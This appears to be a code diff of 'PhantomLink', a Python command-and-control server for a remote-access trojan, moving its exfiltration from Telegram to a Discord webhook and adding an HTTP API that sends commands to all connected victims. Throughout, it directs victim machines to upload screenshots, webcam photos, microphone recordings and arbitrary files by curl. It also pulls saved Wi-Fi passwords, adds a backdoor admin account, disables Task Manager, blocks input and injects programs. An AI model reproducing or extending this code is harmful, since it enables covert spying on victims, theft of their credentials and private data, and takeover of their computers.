@@ -3,37 +3,44 @@ import socket
 import time
 import threading
 import struct
+import os
+import traceback
 from datetime import datetime
 import requests
 from notifypy import Notify
+import http.server
+import json
+from urllib.parse import urlparse, parse_qs
 
 version = 11.7 #7/3/2026
 
 HOST = "0.0.0.0"
 PORT = 5000
 
-#Telegram
-CHAT_ID = ""
+#Discord
+DISCORD_WEBHOOK = "***REMOVED***"
 
 
+def discord_logger(log):
+    """Send a text notification to Discord via Webhook"""
+    try:
+        if len(str(log)) > 1900:
+            log = str(log)[:1900] + "\n... (truncated)"
+        requests.post(DISCORD_WEBHOOK, json={"content": str(log)}, timeout=5)
+    except Exception:
+        pass
 
 
-def tel_logger(log):
-    url = f"https://api.telegram.org/TOKEN/sendMessage"
-    data = {
-        'chat_id': CHAT_ID,
-        'text': log
-    }
-    _response = requests.post(url, data=data)
-
-
-def send_log2(log):
-    url = f"https://api.telegram.org/TOKEN/sendMessage"
-    data = {
-        'chat_id': CHAT_ID,
-        'text': log
-    }
-    _response = requests.post(url, data=data)
+def discord_send_file(file_path, message=""):
+    """Send a file to Discord via Webhook"""
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(DISCORD_WEBHOOK,
+                data={"content": message},
+                files={"file": (os.path.basename(file_path), f)},
+                timeout=30)
+    except Exception:
+        pass
 
 
 class ConnectionHealth:
@@ -117,7 +124,7 @@ class ClientManager:
                 print(f"[!] Failed to get credentials: {e}")
                 try:
                     conn.close()
-                except:
+                except Exception:
                     pass
                 return None
 
@@ -132,7 +139,7 @@ class ClientManager:
             if duplicate_id:
                 print(
                     f"[!] Duplicate connection from {username}@{addr[0]}, removing old connection (ID: {duplicate_id})")
-                tel_logger(
+                discord_logger(
                     f"[!] Duplicate detected: {username}@{addr[0]}, switching from ID {duplicate_id} to {client_id}")
 
                 old_client = self.clients[duplicate_id]
@@ -142,7 +149,7 @@ class ClientManager:
 
                 try:
                     old_client['conn'].close()
-                except:
+                except Exception:
                     pass
                 del self.clients[duplicate_id]
 
@@ -167,36 +174,19 @@ class ClientManager:
             print(f"[+] New client connected: {username}@{addr[0]} (ID: {client_id})")
 
             #Send notifications
-            def send_hi():
-                url = f"https://api.telegram.org/botTOKEN/sendMessage"
-                data = {
-                    'chat_id': CHAT_ID,
-                    'text': "New client connected!"
-                            f"\nClient [{username}] has been connected."
-                }
-                _response = requests.post(url, data=data)
-
-            send_hi()
-
-            def send_log():
-                url = f"https://api.telegram.org/TOKEN/sendMessage"
-                data = {
-                    'chat_id': CHAT_ID,
-                    'text': "New client connected!"
-                            f"\nClient [{username}] has been connected."
-                            f"\n ID: {client_id}"
-                            f"\n@{addr[0]}"
-                }
-                _response = requests.post(url, data=data)
-
-            send_log()
+            discord_logger(f"🟢 **New client connected!**\nClient [{username}] has been connected.\nID: {client_id}\n@{addr[0]}")
 
             notification = Notify()
             notification.application_name = "PhantomLink"
             notification.title = "New Client Connected!"
             notification.message = f"Client: [{username}] has been connected!"
-            notification.icon = "icon.png"
-            notification.send()
+            icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.png")
+            if os.path.exists(icon_path):
+                notification.icon = icon_path
+            try:
+                notification.send()
+            except Exception:
+                pass
 
             return client_id
 
@@ -207,36 +197,23 @@ class ClientManager:
                 client['active'] = False
                 print(f"[-] Client disconnected: {client['username']}@{client['addr'][0]} (ID: {client_id})")
 
-                def send_log1():
-                    url = f"https://api.telegram.org/TOKEN/sendMessage"
-                    data = {
-                        'chat_id': CHAT_ID,
-                        'text': "Client disconnected!"
-                                f"\nClient [{client['username']}] has been disconnected."
-                                f"\n ID: {client_id}"
-                                f"\n@{client['addr'][0]}"
-                    }
-                    _response = requests.post(url, data=data)
-
-                send_log1()
-                send_log2("Client disconnected!"
-                                f"\nClient [{client['username']}] has been disconnected."
-                                f"\n ID: {client_id}"
-                                f"\n@{client['addr'][0]}")
+                discord_logger(f"🔴 **Client disconnected!**\nClient [{client['username']}] has been disconnected.\nID: {client_id}\n@{client['addr'][0]}")
 
                 notification = Notify()
                 notification.application_name = "PhantomLink"
                 notification.title = f"{client['username']} Disconnected!"
                 notification.message = f"Client: {client['username']} has been disconnected!"
-                notification.icon = "icon.png"
+                icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.png")
+                if os.path.exists(icon_path):
+                    notification.icon = icon_path
                 try:
                     notification.send()
-                except:
+                except Exception:
                     pass
 
                 try:
                     client['conn'].close()
-                except:
+                except Exception:
                     pass
                 del self.clients[client_id]
 
@@ -303,7 +280,7 @@ class ClientManager:
 
             #Receive the actual message
             return self._recv_exactly(conn, msglen)
-        except:
+        except Exception:
             return None
 
     def _recv_exactly(self, conn, n):
@@ -319,6 +296,121 @@ class ClientManager:
             except Exception:
                 return None
         return data
+
+
+
+class C2APIHandler(http.server.BaseHTTPRequestHandler):
+    client_manager = None
+    API_KEY = "PhantomLink-API-2026"  # Change this to a secure key
+
+    def _set_headers(self, status_code=200):
+        self.send_response(status_code)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+
+    def _check_auth(self):
+        """Check API key authentication"""
+        api_key = self.headers.get('X-API-Key', '')
+        if api_key != self.API_KEY:
+            self._set_headers(401)
+            self.wfile.write(json.dumps({'error': 'Unauthorized - Invalid API key'}).encode())
+            return False
+        return True
+
+    def do_GET(self):
+        if not self._check_auth():
+            return
+        parsed = urlparse(self.path)
+        if parsed.path == '/api/clients':
+            self._set_headers()
+            clients = self.client_manager.list_clients()
+            safe_clients = []
+            for cid, c in clients.items():
+                safe_clients.append({
+                    'id': cid,
+                    'username': c['username'],
+                    'ip': c['addr'][0]
+                })
+            self.wfile.write(json.dumps({'clients': safe_clients}).encode())
+        elif parsed.path == '/api/status':
+            self._set_headers()
+            self.wfile.write(json.dumps({'status': 'ok'}).encode())
+        else:
+            self._set_headers(404)
+            self.wfile.write(json.dumps({'error': 'Not found'}).encode())
+
+    def do_POST(self):
+        if not self._check_auth():
+            return
+        parsed = urlparse(self.path)
+        if parsed.path == '/api/command':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                cmd = data.get('command')
+                target = data.get('target', 'all')
+                if not cmd:
+                    self._set_headers(400)
+                    self.wfile.write(json.dumps({'error': 'Missing command'}).encode())
+                    return
+
+                results = []
+                clients = self.client_manager.list_clients()
+                
+                targets = []
+                if target == 'all':
+                    targets = list(clients.keys())
+                else:
+                    try:
+                        targets = [int(target)]
+                    except Exception:
+                        pass
+
+                for cid in targets:
+                    client = self.client_manager.get_client(cid)
+                    if client:
+                        conn = client['conn']
+                        with client['lock']:
+                            client['command_in_progress'] = True
+                            if self.client_manager._send_message(conn, f"CMD:{cmd}"):
+                                # Not reading response sync here to avoid blocking API
+                                results.append({'client_id': cid, 'status': 'sent'})
+                            else:
+                                results.append({'client_id': cid, 'status': 'failed'})
+                            client['command_in_progress'] = False
+
+                self._set_headers()
+                self.wfile.write(json.dumps({'results': results}).encode())
+
+            except Exception as e:
+                self._set_headers(500)
+                self.wfile.write(json.dumps({'error': str(e)}).encode())
+        else:
+            self._set_headers(404)
+            self.wfile.write(json.dumps({'error': 'Not found'}).encode())
+
+def start_api_server(client_manager, port=5001):
+    handler = C2APIHandler
+    handler.client_manager = client_manager
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            httpd = http.server.HTTPServer(('0.0.0.0', port), handler)
+            print(f"\n[+] API Server listening on 0.0.0.0:{port}")
+            httpd.serve_forever()
+        except OSError as e:
+            if e.errno == 10048 or 'Address already in use' in str(e):
+                print(f"\n[!] API port {port} already in use, retrying in 5s... ({attempt+1}/{max_retries})")
+                import time
+                time.sleep(5)
+            else:
+                print(f"\n[!] API Server bind error: {e}")
+                break
+        except Exception as e:
+            print(f"\n[!] API Server error: {e}")
+            break
+    print(f"\n[!] API Server failed to start after {max_retries} attempts")
 
 
 def handle_client_connection(client_manager, conn, addr):
@@ -357,7 +449,7 @@ def handle_client_connection(client_manager, conn, addr):
         print(f"[!] Client connection error: {e}")
         import traceback
         traceback.print_exc()
-        tel_logger(f"[!] Connection handler error: {e}\n{traceback.format_exc()}")
+        discord_logger(f"[!] Connection handler error: {e}\n{traceback.format_exc()}")
     finally:
         if keepalive_thread:
             keepalive_event.set()
@@ -391,7 +483,7 @@ def keepalive_handler(client_manager, client_id, stop_event):
 
                     if failure_count >= 3:
                         print(f"[!] Client {client_id} keepalive failed permanently")
-                        tel_logger(f"[!] Client {client_id} keepalive failed permanently")
+                        discord_logger(f"[!] Client {client_id} keepalive failed permanently")
                         client['active'] = False
                         break
                 else:
@@ -404,29 +496,29 @@ def keepalive_handler(client_manager, client_id, stop_event):
 
                         if failure_count >= 3:
                             print(f"[!] Client {client_id} keepalive failed permanently")
-                            tel_logger(f"[!] Client {client_id} keepalive failed permanently")
+                            discord_logger(f"[!] Client {client_id} keepalive failed permanently")
                             client['active'] = False
                             break
 
             except Exception as e:
                 if not stop_event.is_set():
                     print(f"[!] Keepalive error for client {client_id}: {e}")
-                    tel_logger(f"[!] Keepalive error for client {client_id}: {e}")
+                    discord_logger(f"[!] Keepalive error for client {client_id}: {e}")
                 break
             finally:
                 try:
                     conn.settimeout(300.0)
-                except:
+                except Exception:
                     pass
 
-            for _ in range(15):  #Check every 2 seconds for 30 seconds total
-                if stop_event.wait(2):
-                    return
+                for _ in range(15):  #Check every 2 seconds for 30 seconds total
+                    if stop_event.wait(2):
+                        return
 
         except Exception as e:
             if not stop_event.is_set():
                 print(f"[!] Keepalive handler error for client {client_id}: {e}")
-                tel_logger(f"[!] Keepalive handler error for client {client_id}: {e}")
+                discord_logger(f"[!] Keepalive handler error for client {client_id}: {e}")
             break
 
 
@@ -484,13 +576,6 @@ def interact_with_client(client_manager, client_id):
     try:
         #Set timeout for interactive commands
         original_timeout = conn.gettimeout()
-        conn.settimeout(120.0)
-    except:
-        pass
-
-    try:
-        #Set timeout for interactive commands
-        original_timeout = conn.gettimeout()
         conn.settimeout(300.0)
 
         while True:
@@ -543,14 +628,14 @@ def interact_with_client(client_manager, client_id):
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Screenshot from [{username}]:')
+                    discord_logger(f'Screenshot from [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f'Screenshot Taken [{username}]')
+                    discord_logger(f'Screenshot Taken [{username}]')
                     client['command_in_progress'] = False
 
-                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/TOKEN/sendPhoto?chat_id={CHAT_ID}'
+                command3 = f'curl -F "file=@{path2}" -F "content=Screenshot [{username}]" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
@@ -563,17 +648,17 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'send':
                 path = input("FULL Path of file: ")
-                command2 = f'curl -F "document=@{path}" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
+                command2 = f'curl -F "file=@{path}" -F "content=File from [{username}]" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'File from [{username}]:')
+                    discord_logger(f'File from [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"File: {path} sent to Server [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"File: {path} sent to Server [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'get':
@@ -588,7 +673,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"File: {name} sent to client [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"File: {name} sent to client [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'camera':
@@ -607,19 +692,19 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
-                command4 = f'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
+                command4 = f'curl -F "file=@%USERPROFILE%/webcam.jpg" -F "content=Webcam [{username}]" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command4}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Cam Pic from [{username}]:')
+                    discord_logger(f'Cam Pic from [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Photo Sent\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Photo Sent\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'devices':
@@ -632,8 +717,8 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Devices [{username}]: {response.decode('utf-8', errors='ignore')}")
-                    send_log2(f"Devices of [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Devices [{username}]: {response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Devices of [{username}]\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'wifi':
@@ -648,15 +733,15 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     name = input("Select network: ")
                     command2 = f'netsh wlan show profile name="{name}" key=clear | findstr "Key Content"'
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response2 = client_manager._recv_message(conn)
+                    with client['lock']:
+                        if not client_manager._send_message(conn, f"CMD:{command2}"):
+                            client['command_in_progress'] = False
+                            break
+                        response2 = client_manager._recv_message(conn)
                     if response2:
                         print(response2.decode('utf-8', errors='ignore'))
                         client['command_in_progress'] = False
-                        tel_logger(f"Wi-Fi password of [{username}] for the network: {name} is\n{response.decode('utf-8', errors='ignore')}")
-                        send_log2(f"Wi-Fi password of [{username}] for the network: {name} is\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"Wi-Fi password of [{username}] for the network: {name} is\n{response2.decode('utf-8', errors='ignore')}")
 
             elif cmd == 'extract':
                 path = input("FULL Path to file: ")
@@ -670,30 +755,34 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Extracted File [{username}]: {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Extracted File [{username}]: {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'sys' or cmd == 'system':
                 command2 = 'systeminfo'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"(sys) [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"(sys) [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    client['command_in_progress'] = False
 
             elif cmd == 'task':
                 command2 = 'tasklist'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Tasks List [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Tasks List [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    client['command_in_progress'] = False
 
             elif cmd == 'copy':
                 path = input("FULL file path: ")
@@ -707,32 +796,36 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Copied [{username}] {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Copied [{username}] {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'shutdown' or cmd == 'off':
                 command2 = 'shutdown /s /f /t 0'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Shutting down (PC) [{username}] . . . .')
+                    discord_logger(f'Shutting down (PC) [{username}] . . . .')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Client [{username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Client [{username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'restart':
                 command2 = 'shutdown /r /f /t 0'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Restarting (PC) [{username}] . . . .')
+                    discord_logger(f'Restarting (PC) [{username}] . . . .')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Client [{username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Client [{username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'cut':
                 path = input("FULL path: ")
@@ -746,13 +839,13 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"File [{username}] {path} moved to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"File [{username}] {path} moved to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'record':
                 mic = input("Select mic: ")
                 period = input("Seconds: ")
-                tel_logger(f"Recording Audio Now . . . .")
+                discord_logger(f"Recording Audio Now . . . .")
                 ffmpeg_path = r'%USERPROFILE%\ffmpeg\bin\ffmpeg.exe'
                 output_path = r'%USERPROFILE%\mic.wav'
                 command2 = f'powershell -Command "Start-Process \'{ffmpeg_path}\' -ArgumentList \'-f dshow -y -i audio=\\"{mic}\\" -t {period} \\"{output_path}\\"\' -NoNewWindow -Wait"'
@@ -764,18 +857,18 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
 
-                command3 = f'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
+                command3 = f'curl -F "file=@%USERPROFILE%\\mic.wav" -F "content=Audio [{username}]" {DISCORD_WEBHOOK}'
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
                         break
-                    send_log2(f'Voice recording [{username}]:')
+                    discord_logger(f'Voice recording [{username}]:')
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Audio Sent\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Audio Sent\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'ffmpeg':
@@ -788,8 +881,8 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"FFMPEG setting up for [{username}]")
-                    send_log2(f'FFMPEG setting up for [{username}]')
+                    discord_logger(f"FFMPEG setting up for [{username}]")
+                    discord_logger(f'FFMPEG setting up for [{username}]')
 
                 command3 = r'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'
                 with client['lock']:
@@ -800,53 +893,62 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                 print("\nSetting up 'ffmpeg'. Please Wait at least 10 Minutes. \n")
-                tel_logger(f"Setting up 'ffmpeg' for [{username}]. Please Wait at least 10 Minutes.")
-                tel_logger(f"FFMPEG\n\n{response.decode('utf-8', errors='ignore')}")
+                discord_logger(f"Setting up 'ffmpeg' for [{username}]. Please Wait at least 10 Minutes.")
+                if response:
+                    discord_logger(f"FFMPEG\n\n{response.decode('utf-8', errors='ignore')}")
                 client['command_in_progress'] = False
 
             elif cmd == 'ip':
                 command2 = 'powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Global IP for {username}: {response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Global IP for {username}: {response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'lock':
                 command2 = 'rundll32.exe user32.dll,LockWorkStation'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Locked User [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Locked User [{username}]\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'disable task manager':
                 command2 = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Task Manager Disabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Task Manager Disabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'enable task manager':
                 command2 = r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f'
                 with client['lock']:
+                    client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
                         client['command_in_progress'] = False
                         break
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Task Manager Enabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Task Manager Enabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                client['command_in_progress'] = False
 
             elif cmd == 'inject':
                 name = input("FULL name of file: ")
@@ -860,8 +962,8 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
-                    send_log2(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
                 continue
@@ -876,7 +978,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Added PhantomLink user with password: 8211 on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Added PhantomLink user with password: 8211 on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
                 admin = input("Admin? (y/n): ")
                 if admin == 'y':
@@ -889,7 +991,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"(User Admin)\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"(User Admin)\n{response.decode('utf-8', errors='ignore')}")
                         client['command_in_progress'] = False
 
             elif cmd == 'hide':
@@ -903,7 +1005,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"File/Folder {path} made hidden on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"File/Folder {path} made hidden on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'archive':
@@ -918,7 +1020,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"[{username}]\nFile {path} achived to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"[{username}]\nFile {path} achived to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'alert':
@@ -932,14 +1034,14 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"PopUp window appeared on [{username}]\nMessage: {name2}\nwith title{name}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"PopUp window appeared on [{username}]\nMessage: {name2}\nwith title{name}\n\n{response.decode('utf-8', errors='ignore')}")
 
                 continue
 
             elif cmd == 'block':
                 period = input("ALERT: (Must be ADMIN).\nSeconds: ")
                 command2 = fr'''powershell -Command "$code = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlockIt);'; $type = Add-Type -MemberDefinition $code -Name 'InputBlocker' -Namespace 'Win32' -PassThru; $type::BlockInput($true); Start-Sleep -Seconds {period}; $type::BlockInput($false)"'''
-                tel_logger(f"Blocking Inputs for {period} Seconds")
+                discord_logger(f"Blocking Inputs for {period} Seconds")
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -948,7 +1050,7 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Inputs Blocked on [{username}] for {period}\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Inputs Blocked on [{username}] for {period}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'hosts':
@@ -964,7 +1066,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"Blocked {link} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"Blocked {link} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                         client['command_in_progress'] = False
 
                     command5 = 'ipconfig /flushdns'
@@ -975,7 +1077,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"{response.decode('utf-8', errors='ignore')}")
                 elif rule.strip().lower() == 'unblock':
                     link2 = input("Enter the link without www or .com: ")
                     endlink = input("Enter the end of link without '.' eg(com): ")
@@ -988,7 +1090,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"Unblocked {link2}.{endlink} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"Unblocked {link2}.{endlink} on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                         client['command_in_progress'] = False
 
                     command4 = 'ipconfig /flushdns'
@@ -999,7 +1101,7 @@ def interact_with_client(client_manager, client_id):
                         response = client_manager._recv_message(conn)
                     if response:
                         print(response.decode('utf-8', errors='ignore'))
-                        tel_logger(f"{response.decode('utf-8', errors='ignore')}")
+                        discord_logger(f"{response.decode('utf-8', errors='ignore')}")
                 else:
                     print("Invalid input")
 
@@ -1014,19 +1116,21 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    tel_logger(f"Played Audio {path} silently\n\n{response.decode('utf-8', errors='ignore')}")
+                    discord_logger(f"Played Audio {path} silently\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
